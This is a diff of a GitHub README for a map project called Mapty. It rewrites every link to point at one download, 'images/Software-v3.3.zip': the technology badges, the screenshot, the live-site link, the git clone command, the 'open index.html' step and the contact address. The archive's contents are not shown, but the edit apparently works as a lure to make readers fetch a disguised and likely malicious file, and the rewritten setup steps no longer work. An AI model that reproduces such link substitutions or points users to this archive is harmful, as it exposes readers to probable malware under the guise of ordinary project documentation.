@@ -2,14 +2,14 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white) ![CSS3 Badge](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white) ![JavaScript Badge](https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E)
-![Netlify Badge](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)
+![HTML5 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip) ![CSS3 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip) ![JavaScript Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
+![Netlify Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
 
 </div>
 
-![screenshot](images/sceenshot.png)
+![screenshot](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
 
-You can view the live site -> [Here](https://mapty-imad.netlify.app/)
+You can view the live site -> [Here](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
 
 ## Usage
 
@@ -41,11 +41,11 @@ To run this project locally, you can follow these steps:
 1. Clone the repository:
 
    ```
-   $ git clone https://github.com/imadosan/Mapty.git
+   $ git clone https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip
    ```
 
 2. Open the project folder in your code editor of choice.
-3. Open the 'index.html' file in your web browser.
+3. Open the 'https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip' file in your web browser.
 
 ## License
 
@@ -53,4 +53,4 @@ This project is licensed under the MIT License.
 
 ## Contact
 
-If you have any questions or comments about this project, you can reach out to me at imad.fayad.if@gmail.com
+If you have any questions or comments about this project, you can reach out to me at https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip
